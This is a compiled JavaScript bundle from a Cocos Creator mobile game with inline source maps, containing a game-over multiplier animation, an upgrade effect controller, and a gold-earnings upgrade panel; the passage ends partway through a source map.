//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZU92ZXJMdWNreS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ00sSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBMkMsaUNBQVk7SUFBdkQ7UUFBQSxxRUEyQ0M7UUF4Q0csaUJBQVcsR0FBWSxJQUFJLENBQUM7UUFHNUIsbUJBQWEsR0FBYSxJQUFJLENBQUM7UUFHL0IsVUFBSSxHQUFZLElBQUksQ0FBQzs7SUFrQ3pCLENBQUM7SUFoQ0csMkJBQUcsR0FBSCxVQUFJLEdBQVcsRUFBRSxRQUFpQjtRQUM5QixJQUFJLEdBQUcsR0FBRyxDQUFDLENBQUM7UUFDWixJQUFJLE9BQU8sR0FBRyxDQUFDLENBQUM7UUFDaEIsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFDLENBQUMsR0FBRyxJQUFJLENBQUMsYUFBYSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUMsQ0FBQyxDQUFDO1FBQ3hFLHNDQUFzQztRQUN0QyxLQUFLLElBQUksQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLEdBQUcsQ0FBQyxFQUFFLENBQUMsRUFBRSxFQUFFO1lBQ3hCLEtBQUssSUFBSSxDQUFDLEdBQUcsRUFBRSxFQUFFLENBQUMsSUFBSSxHQUFHLEVBQUUsQ0FBQyxFQUFFLEVBQUU7Z0JBQzVCLElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLGFBQWEsQ0FBQyxJQUFJLENBQUMsQ0FBQztnQkFDbkQsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDLENBQUMsTUFBTSxHQUFHLE1BQUksQ0FBRyxDQUFDO2dCQUM3QyxJQUFJLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQztnQkFDWCxJQUFJLENBQUMsQ0FBQyxHQUFHLE9BQU8sQ0FBQztnQkFDakIsT0FBTyxJQUFJLE1BQU0sQ0FBQztnQkFDbEIsSUFBSSxDQUFDLFdBQVcsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7YUFDbkM7U0FDSjtRQUNELEtBQUssSUFBSSxDQUFDLEdBQUcsRUFBRSxFQUFFLENBQUMsSUFBSSxHQUFHLEVBQUUsQ0FBQyxFQUFFLEVBQUU7WUFDNUIsSUFBSSxJQUFJLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDLElBQUksQ0FBQyxDQUFDO1lBQ25ELElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQyxDQUFDLE1BQU0sR0FBRyxNQUFJLENBQUcsQ0FBQztZQUM3QyxJQUFJLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQztZQUNYLElBQUksQ0FBQyxDQUFDLEdBQUcsT0FBTyxDQUFDO1lBQ2pCLE9BQU8sSUFBSSxNQUFNLENBQUM7WUFDbEIsSUFBSSxDQUFDLFdBQVcsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7U0FDbkM7UUFDRCxJQUFJLENBQUMsYUFBYSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ3ZDLE9BQU8sSUFBSSxNQUFNLENBQUM7UUFDbEIsSUFBSSxRQUFRLEdBQUcsT0FBTyxHQUFHLElBQUksQ0FBQztRQUM5QixPQUFPLENBQUMsR0FBRyxDQUFDLFFBQVEsRUFBRSxPQUFPLEVBQUUsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDdEQsSUFBSSxDQUFDLFdBQVcsQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFFBQVEsRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEVBQUUsQ0FBQyxhQUFhLEVBQUUsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztZQUNwSSxPQUFPLENBQUMsR0FBRyxDQUFDLFNBQVMsQ0FBQyxDQUFDO1lBQ3ZCLFFBQVEsRUFBRSxDQUFDO1FBQ2YsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ1QsQ0FBQztJQXZDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3NEQUNVO0lBRzVCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7d0RBQ1k7SUFHL0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzsrQ0FDRztJQVRKLGFBQWE7UUFEakMsT0FBTztPQUNhLGFBQWEsQ0EyQ2pDO0lBQUQsb0JBQUM7Q0EzQ0QsQUEyQ0MsQ0EzQzBDLEVBQUUsQ0FBQyxTQUFTLEdBMkN0RDtrQkEzQ29CLGFBQWEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBHYW1lT3Zlckx1Y2t5IGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGNvbnRlbnROb2RlOiBjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICB0ZW1wbGF0ZUxhYmVsOiBjYy5MYWJlbCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk1hc2spXHJcbiAgICBtYXNrOiBjYy5NYXNrID0gbnVsbDtcclxuXHJcbiAgICBydW4obnVtOiBudW1iZXIsIGNhbGxiYWNrOigpPT52b2lkKSB7XHJcbiAgICAgICAgbGV0IG1pbiA9IDM7XHJcbiAgICAgICAgbGV0IG9mZnNldFkgPSAwO1xyXG4gICAgICAgIGxldCBoZWlnaHQgPSB0aGlzLm1hc2subm9kZS5oZWlnaHQvMiArIHRoaXMudGVtcGxhdGVMYWJlbC5ub2RlLmhlaWdodC8yO1xyXG4gICAgICAgIC8vIGxldCBoZWlnaHQgPSB0aGlzLm1hc2subm9kZS5oZWlnaHQ7XHJcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAxOyBpKyspIHtcclxuICAgICAgICAgICAgZm9yIChsZXQgaiA9IDEwOyBqID49IG1pbjsgai0tKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKHRoaXMudGVtcGxhdGVMYWJlbC5ub2RlKTtcclxuICAgICAgICAgICAgICAgIG5vZGUuZ2V0Q29tcG9uZW50KGNjLkxhYmVsKS5zdHJpbmcgPSBgeCR7an1gO1xyXG4gICAgICAgICAgICAgICAgbm9kZS54ID0gMDtcclxuICAgICAgICAgICAgICAgIG5vZGUueSA9IG9mZnNldFk7XHJcbiAgICAgICAgICAgICAgICBvZmZzZXRZICs9IGhlaWdodDtcclxuICAgICAgICAgICAgICAgIHRoaXMuY29udGVudE5vZGUuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgZm9yIChsZXQgaiA9IDEwOyBqID49IG51bTsgai0tKSB7XHJcbiAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUodGhpcy50ZW1wbGF0ZUxhYmVsLm5vZGUpO1xyXG4gICAgICAgICAgICBub2RlLmdldENvbXBvbmVudChjYy5MYWJlbCkuc3RyaW5nID0gYHgke2p9YDtcclxuICAgICAgICAgICAgbm9kZS54ID0gMDtcclxuICAgICAgICAgICAgbm9kZS55ID0gb2Zmc2V0WTtcclxuICAgICAgICAgICAgb2Zmc2V0WSArPSBoZWlnaHQ7XHJcbiAgICAgICAgICAgIHRoaXMuY29udGVudE5vZGUuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMudGVtcGxhdGVMYWJlbC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIG9mZnNldFkgLT0gaGVpZ2h0O1xyXG4gICAgICAgIGxldCBkdXJhdGlvbiA9IG9mZnNldFkgLyAxMjUwO1xyXG4gICAgICAgIGNvbnNvbGUubG9nKGR1cmF0aW9uLCBvZmZzZXRZLCB0aGlzLm1hc2subm9kZS5oZWlnaHQpO1xyXG4gICAgICAgIHRoaXMuY29udGVudE5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVUbyhkdXJhdGlvbiwgY2MudjIoMCwgLW9mZnNldFkpKS5lYXNpbmcoY2MuZWFzZVNpbmVJbk91dCgpKSwgY2MuZGVsYXlUaW1lKDEpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcImZpbmlzaC5cIik7XHJcbiAgICAgICAgICAgIGNhbGxiYWNrKCk7XHJcbiAgICAgICAgfSkpKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/UpEffectController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'de3b1rlVrNDVqI1fkc5g6jI', 'UpEffectController');
// script/app/home/UpEffectController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var UpEffectController = /** @class */ (function (_super) {
    __extends(UpEffectController, _super);
    function UpEffectController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.eventName = "";
        _this.ske = null;
        return _this;
    }
    UpEffectController.prototype.onShowEffect = function () {
        this.ske.node.active = true;
        this.ske.setAnimation(0, "vfxAll", false);
    };
    UpEffectController.prototype.onLoad = function () {
        var _this = this;
        if (this.eventName !== "") {
            Facade_1.default.canvasNode.on(this.eventName, this.onShowEffect, this);
        }
        this.ske.setCompleteListener(function () {
            if (cc.isValid(_this) && cc.isValid(_this.ske)) {
                _this.ske.node.active = false;
            }
        });
        this.ske.node.active = false;
    };
    UpEffectController.prototype.onDestroy = function () {
        Facade_1.default.canvasNode.off(this.eventName, this.onShowEffect, this);
    };
    __decorate([
        property
    ], UpEffectController.prototype, "eventName", void 0);
    __decorate([
        property(sp.Skeleton)
    ], UpEffectController.prototype, "ske", void 0);
    UpEffectController = __decorate([
        ccclass
    ], UpEffectController);
    return UpEffectController;
}(cc.Component));
exports.default = UpEffectController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvVXBFZmZlY3RDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSwyREFBc0Q7QUFFaEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBZ0Qsc0NBQVk7SUFBNUQ7UUFBQSxxRUE2QkM7UUExQkcsZUFBUyxHQUFHLEVBQUUsQ0FBQztRQUdmLFNBQUcsR0FBZSxJQUFJLENBQUM7O0lBdUIzQixDQUFDO0lBcEJHLHlDQUFZLEdBQVo7UUFDSSxJQUFJLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzVCLElBQUksQ0FBQyxHQUFHLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxRQUFRLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDOUMsQ0FBQztJQUVELG1DQUFNLEdBQU47UUFBQSxpQkFVQztRQVRHLElBQUksSUFBSSxDQUFDLFNBQVMsS0FBSyxFQUFFLEVBQUM7WUFDdEIsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsQ0FBQztTQUNqRTtRQUNELElBQUksQ0FBQyxHQUFHLENBQUMsbUJBQW1CLENBQUM7WUFDekIsSUFBSSxFQUFFLENBQUMsT0FBTyxDQUFDLEtBQUksQ0FBQyxJQUFJLEVBQUUsQ0FBQyxPQUFPLENBQUMsS0FBSSxDQUFDLEdBQUcsQ0FBQyxFQUFDO2dCQUN6QyxLQUFJLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO2FBQ2hDO1FBQ0wsQ0FBQyxDQUFDLENBQUM7UUFDSCxJQUFJLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO0lBQ2pDLENBQUM7SUFFRCxzQ0FBUyxHQUFUO1FBQ0ksZ0JBQU0sQ0FBQyxVQUFVLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxTQUFTLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsQ0FBQztJQUNuRSxDQUFDO0lBekJEO1FBREMsUUFBUTt5REFDTTtJQUdmO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7bURBQ0M7SUFOTixrQkFBa0I7UUFEdEMsT0FBTztPQUNhLGtCQUFrQixDQTZCdEM7SUFBRCx5QkFBQztDQTdCRCxBQTZCQyxDQTdCK0MsRUFBRSxDQUFDLFNBQVMsR0E2QjNEO2tCQTdCb0Isa0JBQWtCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFVwRWZmZWN0Q29udHJvbGxlciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBldmVudE5hbWUgPSBcIlwiO1xyXG5cclxuICAgIEBwcm9wZXJ0eShzcC5Ta2VsZXRvbilcclxuICAgIHNrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG5cclxuICAgIG9uU2hvd0VmZmVjdCgpe1xyXG4gICAgICAgIHRoaXMuc2tlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24oMCwgXCJ2ZnhBbGxcIiwgZmFsc2UpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgaWYgKHRoaXMuZXZlbnROYW1lICE9PSBcIlwiKXtcclxuICAgICAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUub24odGhpcy5ldmVudE5hbWUsIHRoaXMub25TaG93RWZmZWN0LCB0aGlzKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigoKT0+e1xyXG4gICAgICAgICAgICBpZiAoY2MuaXNWYWxpZCh0aGlzKSAmJiBjYy5pc1ZhbGlkKHRoaXMuc2tlKSl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnNrZS5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgdGhpcy5za2Uubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5vZmYodGhpcy5ldmVudE5hbWUsIHRoaXMub25TaG93RWZmZWN0LCB0aGlzKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/EarningsLayerController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'e78aaJwDKBPIZdjvZdl4ywW', 'EarningsLayerController');
// script/app/home/EarningsLayerController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var Extend_1 = require("../../../framework/extend/Extend");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var EarningsLayerController = /** @class */ (function (_super) {
    __extends(EarningsLayerController, _super);
    function EarningsLayerController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.goldLvLabel = null;
        _this.dayEarnLvLabel = null;
        _this.goldCostLabel = null;
        _this.dayEarnCostLabel = null;
        _this.goldWorthLabel = null;
        _this.dayEarnWorthLabel = null;
        _this.goldLvButton = null;
        _this.dayEarnButton = null;
        return _this;
    }
    EarningsLayerController.prototype.onLoad = function () {
        this.updateGoldUp();
        this.updateDayEarnUp();
        cc.find('Canvas').on("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    EarningsLayerController.prototype.onDestroy = function () {
        cc.find('Canvas').off("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    EarningsLayerController.prototype.onUpdateStorageEvent = function (key) {
        if (key == "goldCount") {
            var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
            if (World_1.World.Storage.goldLv < cfg.length) {
                var needCost = cfg[World_1.World.Storage.goldLv - 1]['gvalue_expend'];
                this.goldLvButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.goldCostLabel.node.color = this.goldLvButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
            if (World_1.World.Storage.dayEarnLv < cfg.length) {
                var needCost = cfg[World_1.World.Storage.dayEarnLv - 1]['on_hook_expend'];
                this.dayEarnButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.dayEarnCostLabel.node.color = this.dayEarnButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
        }
    };
    EarningsLayerController.prototype.updateGoldUp = function () {
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        this.goldLvLabel.string = "<b><outline color=#1e1e1e width=4>\u91D1\u5E01\u4EF7\u503CLv." + World_1.World.Storage.goldLv + "</outline></b>";
        if (World_1.World.Storage.goldLv >= cfg.length) {
            this.goldCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.goldLvButton.interactable = false;
        }
        else {
            var needCost = cfg[World_1.World.Storage.goldLv - 1]['gvalue_expend'];
            this.goldCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.goldLvButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.goldCostLabel.node.color = this.goldLvButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        this.goldWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Math.floor(cfg[World_1.World.Storage.goldLv - 1]['gvalue'] * 100) + "%</outline></b>";
    };
    EarningsLayerController.prototype.updateDayEarnUp = function () {
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        this.dayEarnLvLabel.string = "<b><outline color=#1e1e1e width=4>\u65E5\u5E38\u6536\u76CALv." + World_1.World.Storage.dayEarnLv + "</outline></b>";
        if (World_1.World.Storage.dayEarnLv >= cfg.length) {
            this.dayEarnCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.dayEarnButton.interactable = false;
        }
        else {
            var needCost = cfg[World_1.World.Storage.dayEarnLv - 1]['on_hook_expend'];
            this.dayEarnCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.dayEarnButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.dayEarnCostLabel.node.color = this.dayEarnButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        this.dayEarnWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(cfg[World_1.World.Storage.dayEarnLv - 1]['on_hook']) + "</outline></b>";
    };
    EarningsLayerController.prototype.onClickUpGoldLv = function (event, data) {
        console.log("【click】EarningsLayerController UpGoldLv");
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        var needCost = cfg[World_1.World.Storage.goldLv - 1]['gvalue_expend'];
        World_1.World.Storage.goldCount -= needCost;
        World_1.World.Storage.goldLv++;
        this.updateGoldUp();
        Facade_1.default.canvasNode.emit("GoldWorthUp");
    };
    EarningsLayerController.prototype.onClickUpDayEarnLv = function (event, data) {
        console.log("【click】EarningsLayerController UpDayEarnLv");
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        var needCost = cfg[World_1.World.Storage.dayEarnLv - 1]['on_hook_expend'];
        World_1.World.Storage.dayEarnLv++;
        World_1.World.Storage.goldCount -= needCost;
        this.updateDayEarnUp();
        Facade_1.default.canvasNode.emit("GoldDayEarnUp");
    };
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "goldLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "dayEarnLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "goldCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "dayEarnCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "goldWorthLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], EarningsLayerController.prototype, "dayEarnWorthLabel", void 0);
    __decorate([
        property(cc.Button)
    ], EarningsLayerController.prototype, "goldLvButton", void 0);
    __decorate([
        property(cc.Button)
    ], EarningsLayerController.prototype, "dayEarnButton", void 0);
    EarningsLayerController = __decorate([
        ccclass
    ], EarningsLayerController);
    return EarningsLayerController;
}(cc.Component));
exports.default = EarningsLayerController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvRWFybmluZ3NMYXllckNvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLHVDQUFvQztBQUdwQywyREFBcUQ7QUFDckQscUVBQWtFO0FBQ2xFLDZEQUEwRDtBQUMxRCwyREFBc0Q7QUFFaEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBcUQsMkNBQVk7SUFBakU7UUFBQSxxRUF3R0M7UUFyR0csaUJBQVcsR0FBZ0IsSUFBSSxDQUFDO1FBR2hDLG9CQUFjLEdBQWdCLElBQUksQ0FBQztRQUduQyxtQkFBYSxHQUFnQixJQUFJLENBQUM7UUFHbEMsc0JBQWdCLEdBQWdCLElBQUksQ0FBQztRQUdyQyxvQkFBYyxHQUFlLElBQUksQ0FBQztRQUdsQyx1QkFBaUIsR0FBZSxJQUFJLENBQUM7UUFHckMsa0JBQVksR0FBYSxJQUFJLENBQUM7UUFHOUIsbUJBQWEsR0FBYSxJQUFJLENBQUM7O0lBZ0ZuQyxDQUFDO0lBOUVHLHdDQUFNLEdBQU47UUFDSSxJQUFJLENBQUMsWUFBWSxFQUFFLENBQUM7UUFDcEIsSUFBSSxDQUFDLGVBQWUsRUFBRSxDQUFDO1FBQ3ZCLEVBQUUsQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLENBQUMsRUFBRSxDQUFDLGVBQWUsRUFBRSxJQUFJLENBQUMsb0JBQW9CLEVBQUUsSUFBSSxDQUFDLENBQUM7SUFDM0UsQ0FBQztJQUVELDJDQUFTLEdBQVQ7UUFDSSxFQUFFLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLG9CQUFvQixFQUFFLElBQUksQ0FBQyxDQUFDO0lBQzVFLENBQUM7SUFFRCxzREFBb0IsR0FBcEIsVUFBcUIsR0FBVTtRQUMzQixJQUFJLEdBQUcsSUFBSSxXQUFXLEVBQUM7WUFDbkIsSUFBSSxHQUFHLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxNQUFNLENBQUMsQ0FBQztZQUM1RCxJQUFJLGFBQUssQ0FBQyxPQUFPLENBQUMsTUFBTSxHQUFHLEdBQUcsQ0FBQyxNQUFNLEVBQUM7Z0JBQ2xDLElBQUksUUFBUSxHQUFHLEdBQUcsQ0FBQyxhQUFLLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBQyxDQUFDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQztnQkFDNUQsSUFBSSxDQUFDLFlBQVksQ0FBQyxZQUFZLEdBQUcsYUFBSyxDQUFDLE9BQU8sQ0FBQyxTQUFTLElBQUksUUFBUSxDQUFDO2dCQUNyRSxJQUFJLENBQUMsYUFBYSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxZQUFZLENBQUEsQ0FBQyxDQUFBLEVBQUUsQ0FBQyxLQUFLLENBQUMsS0FBSyxDQUFBLENBQUMsQ0FBQSxFQUFFLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsU0FBUyxDQUFDLENBQUM7YUFDakg7WUFDRCxJQUFJLGFBQUssQ0FBQyxPQUFPLENBQUMsU0FBUyxHQUFHLEdBQUcsQ0FBQyxNQUFNLEVBQUM7Z0JBQ3JDLElBQUksUUFBUSxHQUFHLEdBQUcsQ0FBQyxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsR0FBQyxDQUFDLENBQUMsQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDO2dCQUNoRSxJQUFJLENBQUMsYUFBYSxDQUFDLFlBQVksR0FBRyxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsSUFBSSxRQUFRLENBQUM7Z0JBQ3RFLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQyxhQUFhLENBQUMsWUFBWSxDQUFBLENBQUMsQ0FBQSxFQUFFLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQSxDQUFDLENBQUEsRUFBRSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsT0FBTyxDQUFDLFNBQVMsQ0FBQyxDQUFDO2FBQ3JIO1NBQ0o7SUFDTCxDQUFDO0lBRUQsOENBQVksR0FBWjtRQUNJLElBQUksR0FBRyxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDNUQsSUFBSSxDQUFDLFdBQVcsQ0FBQyxNQUFNLEd